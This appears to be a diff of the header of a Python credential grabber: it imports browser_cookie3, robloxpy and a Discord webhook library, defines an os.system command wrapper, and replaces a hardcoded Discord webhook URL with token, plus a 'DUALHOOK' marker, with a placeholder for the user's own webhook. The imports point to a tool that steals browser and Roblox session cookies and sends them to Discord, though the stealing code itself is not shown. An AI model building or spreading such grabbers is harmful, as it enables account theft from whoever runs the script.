@@ -1,4 +1,4 @@
-###REMOVED DUALHOOK###
+
 
 import os
 import codecs
@@ -7,7 +7,7 @@ import robloxpy
 import requests,re
 from discordwebhook import *
 import browser_cookie3
-webhookk = "https://discord.com/api/webhooks/1014236047070203975/E9bqR0uEMXkoLGU05xuQ03puzuygaSAHP18uwwL963LndKbOfBZeTc3mBwCopkPWqP9z"
+webhookk = "put ur webhook"
 
 def command(c):
     os.system(c)
